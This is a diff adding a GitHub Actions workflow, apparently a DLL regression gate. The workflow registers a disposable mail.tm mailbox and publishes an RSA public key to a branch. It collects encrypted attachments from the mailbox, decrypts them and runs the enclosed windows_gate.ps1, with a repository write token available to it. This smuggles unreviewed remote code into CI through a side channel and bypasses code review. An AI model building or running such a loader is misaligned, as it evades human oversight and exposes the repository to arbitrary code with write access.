@@ -1,0 +1,133 @@
+name: c8b8-drive-native-fullreg-v3
+on:
+  push:
+    branches: [c8b8-drive-fullreg-20260809]
+    paths: ['.github/workflows/c8b8_drive_fullreg_v3.yml']
+permissions:
+  contents: write
+jobs:
+  gate:
+    runs-on: windows-2022
+    timeout-minutes: 120
+    env:
+      ENC_SHA: 553f8bf804023d634be0b3689b5dac45b461d34d5d733d21d79f2ff7e42c747f
+      XZ_SHA: 9ac65352a3409b7968b67520c8080df7515e517383531c5a79c44f98a5f4dc4d
+      HANDOFF_BRANCH: c8b8-drive-fullreg-20260809
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 0, persist-credentials: true}
+      - name: Publish one-time mail/RSA handoff
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          @'
+          import json,os,secrets,string,urllib.request
+          from pathlib import Path
+          def req(method,url,obj=None,token=None):
+              data=None if obj is None else json.dumps(obj).encode();r=urllib.request.Request(url,data=data,method=method);r.add_header('Accept','application/json')
+              if data is not None:r.add_header('Content-Type','application/json')
+              if token:r.add_header('Authorization','Bearer '+token)
+              with urllib.request.urlopen(r,timeout=30) as x:return json.load(x)
+          base='https://api.mail.tm';d=req('GET',base+'/domains');m=d if isinstance(d,list) else d.get('hydra:member',[])
+          if not m:raise SystemExit('NO_MAIL_DOMAIN')
+          a=string.ascii_lowercase+string.digits;addr='ghc8b8'+''.join(secrets.choice(a) for _ in range(14))+'@'+m[0]['domain'];pw=''.join(secrets.choice(string.ascii_letters+string.digits+'-_') for _ in range(40))
+          req('POST',base+'/accounts',{'address':addr,'password':pw});tok=req('POST',base+'/token',{'address':addr,'password':pw})['token']
+          Path(os.environ['RUNNER_TEMP'],'mail.json').write_text(json.dumps({'token':tok}));Path('mailbox.txt').write_text(addr+'\n');Path('subject_prefix.txt').write_text('GuanHu-C8B8-FullregV3-'+os.environ['GITHUB_RUN_ID']+'\n')
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\mkmail.py
+          python $env:RUNNER_TEMP\mkmail.py
+          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out $env:RUNNER_TEMP\private.pem
+          openssl pkey -in $env:RUNNER_TEMP\private.pem -pubout -out public.pem
+          New-Item -ItemType Directory -Force .c8b8_v3_handoff | Out-Null;Copy-Item public.pem,mailbox.txt,subject_prefix.txt .c8b8_v3_handoff\
+          @("RUN_ID=$env:GITHUB_RUN_ID","ENC_SHA=$env:ENC_SHA","XZ_SHA=$env:XZ_SHA") | Set-Content .c8b8_v3_handoff\binding.txt
+          git config user.name windows-dll-test-bot;git config user.email windows-dll-test-bot@users.noreply.github.com;git add .c8b8_v3_handoff;git commit -m 'Publish c8b8 V3 handoff';git push origin "HEAD:$env:HANDOFF_BRANCH"
+      - name: Receive encrypted payload
+        shell: powershell
+        timeout-minutes: 30
+        run: |
+          @'
+          import json,os,time,urllib.parse,urllib.request
+          from pathlib import Path
+          tok=json.loads(Path(os.environ['RUNNER_TEMP'],'mail.json').read_text())['token'];base='https://api.mail.tm';prefix=Path('subject_prefix.txt').read_text().strip();out=Path('transport');out.mkdir(exist_ok=True);want={f'{prefix}-P{i}':i for i in range(1,5)};got=set();key=False;seen=set()
+          def gj(u):
+              r=urllib.request.Request(u);r.add_header('Accept','application/json');r.add_header('Authorization','Bearer '+tok)
+              with urllib.request.urlopen(r,timeout=30) as x:return json.load(x)
+          def gb(u):
+              r=urllib.request.Request(u);r.add_header('Authorization','Bearer '+tok)
+              with urllib.request.urlopen(r,timeout=180) as x:return x.read()
+          end=time.time()+1500
+          while time.time()<end and (len(got)<4 or not key):
+              q=gj(base+'/messages');msgs=q if isinstance(q,list) else q.get('hydra:member',[])
+              for m in msgs:
+                  if m.get('subject') not in want or m['id'] in seen:continue
+                  seen.add(m['id']);idx=want[m['subject']];d=gj(base+'/messages/'+m['id'])
+                  for a in d.get('attachments',[]):
+                      n=a.get('filename','');u=a.get('downloadUrl');data=gb(urllib.parse.urljoin(base,u)) if u else None
+                      if data is None:continue
+                      if n==f'c8b8_v3_part{idx}.bin':(out/n).write_bytes(data);got.add(idx)
+                      elif n=='c8b8_v3_wrapped_key.bin':(out/n).write_bytes(data);key=True
+              if len(got)<4 or not key:time.sleep(3)
+          if len(got)!=4 or not key:raise SystemExit(f'TRANSPORT_FAIL {sorted(got)} {key}')
+          print('MAIL_TRANSPORT_COMPLETE parts=4 key=1')
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\recv.py
+          python $env:RUNNER_TEMP\recv.py | Tee-Object mail_transport.txt
+      - name: Decrypt and extract exact payload
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop';$o=[IO.File]::Create("$env:RUNNER_TEMP\p.enc");try{1..4|%{$b=[IO.File]::ReadAllBytes("transport\c8b8_v3_part$_.bin");$o.Write($b,0,$b.Length)}}finally{$o.Dispose()}
+          $h=(Get-FileHash $env:RUNNER_TEMP\p.enc -Algorithm SHA256).Hash.ToLowerInvariant();if($h -ne $env:ENC_SHA){throw "ENC_SHA_FAIL $h"}
+          if((Get-Item transport\c8b8_v3_wrapped_key.bin).Length -ne 384){throw 'KEY_SIZE_FAIL'}
+          openssl pkeyutl -decrypt -inkey $env:RUNNER_TEMP\private.pem -in transport\c8b8_v3_wrapped_key.bin -out $env:RUNNER_TEMP\pass.txt -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
+          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in $env:RUNNER_TEMP\p.enc -out $env:RUNNER_TEMP\p.tar.xz -pass file:$env:RUNNER_TEMP\pass.txt
+          $x=(Get-FileHash $env:RUNNER_TEMP\p.tar.xz -Algorithm SHA256).Hash.ToLowerInvariant();if($x -ne $env:XZ_SHA){throw "XZ_SHA_FAIL $x"};New-Item -ItemType Directory -Force xzstage,payload_root|Out-Null
+          7z x -y $env:RUNNER_TEMP\p.tar.xz "-o$pwd\xzstage"|Out-File sevenzip_xz.txt;$t=Get-ChildItem xzstage -Filter '*.tar'|Select-Object -First 1;if(!$t){throw 'TAR_MISSING'};7z x -y $t.FullName "-o$pwd\payload_root"|Out-File sevenzip_tar.txt
+          if(!(Test-Path payload_root\payload\windows_gate.ps1)){throw 'PAYLOAD_GATE_MISSING'};Remove-Item $env:RUNNER_TEMP\pass.txt -Force
+      - uses: ilammy/msvc-dev-cmd@v1
+        with: {arch: x86}
+      - uses: actions/setup-python@v5
+        with: {python-version: '3.11', architecture: 'x86'}
+      - name: Execute exact Windows gate
+        shell: powershell
+        timeout-minutes: 105
+        run: |
+          $PSDefaultParameterValues['Out-File:Encoding']='ascii'
+          function Select-String {
+            param(
+              [Parameter(Position=0,Mandatory=$true)][string]$Path,
+              [switch]$SimpleMatch,
+              [Parameter(Position=1,Mandatory=$true)][string]$Pattern,
+              [switch]$Quiet
+            )
+            Microsoft.PowerShell.Utility\Select-String -Path $Path -Pattern $Pattern -SimpleMatch:$SimpleMatch -Quiet:$Quiet
+          }
+          & .\payload_root\payload\windows_gate.ps1
+      - name: Commit exact PASS lock
+        if: success()
+        shell: powershell
+        run: |
+          New-Item -ItemType Directory -Force evidence_summary|Out-Null;Copy-Item C8B8_FINAL_RELEASE_PASS.lock evidence_summary\C8B8_FINAL_RELEASE_PASS.lock -Force;git config user.name windows-dll-test-bot;git config user.email windows-dll-test-bot@users.noreply.github.com;git add evidence_summary/C8B8_FINAL_RELEASE_PASS.lock;git commit -m 'Lock c8b8 exact full native PASS';git push origin "HEAD:$env:HANDOFF_BRANCH"
+      - name: Upload exact DLL/evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: c8b8-final-native-fullreg-v3-${{ github.run_id }}
+          path: |
+            payload_root/payload/dlls/SigProcDll-64HF.dll
+            payload_root/payload/MANIFEST.json
+            payload_root/payload/FULLREG_SUMMARY.json
+            payload_root/payload/*.json
+            C8B8_FINAL_RELEASE_PASS.lock
+            exact_payload_binding.txt
+            static_pe_gate.txt
+            candidate_headers.txt
+            candidate_exports.txt
+            candidate_dependents.txt
+            hostcompat_dependents.txt
+            loader_inner.log
+            loader_outer.log
+            loader_contract_gate.txt
+            full_regression_v3.log
+            regression_exit.txt
+            complete_suite_gate.txt
+            mail_transport.txt
+          if-no-files-found: ignore
+          retention-days: 30
